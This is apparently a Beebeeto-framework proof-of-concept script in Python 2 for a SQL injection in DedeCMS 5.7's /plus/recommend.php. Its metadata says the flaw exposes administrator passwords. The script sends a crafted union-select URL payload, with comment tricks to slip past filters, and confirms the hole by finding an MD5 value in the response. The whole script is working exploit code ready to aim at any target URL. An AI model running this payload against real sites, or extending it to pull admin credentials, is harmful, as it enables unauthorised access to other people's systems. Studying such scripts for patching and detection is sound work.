#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0065',
            'name': 'DedeCMS 5.7 /plus/recommend.php SQL注入漏洞 POC',
            'author': 'foundu',
            'create_date': '2014-10-12',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'DedeCMS',
            'vul_version': ['5.7'],
            'type': 'SQL Injection',
            'tag': ['DedeCMS漏洞', 'SQL Injection漏洞', '/plus/recommend.php'],
            'desc': 'Dedecms 5.7 /plus/recommend.php处存在一个sql注入漏洞，可以直接管理员账户密码。',
            'references': ['http://www.freebuf.com/tools/27206.html',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = ("/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\'%20%20or%20mid=@`\\'`"
                   "%20/*!50000union*//*!50000select*/1,2,3,(select%20%20CONCAT(md5(3134))+from+`%23@__admin`"
                   "%20limit+0,1),5,6,7,8,9%23@`\\'`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/"
                   "octet-stream&_FILES[type][size]=111")
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '35937e34256cf4e5b2f7da08871d2a0b' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            return args
        args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
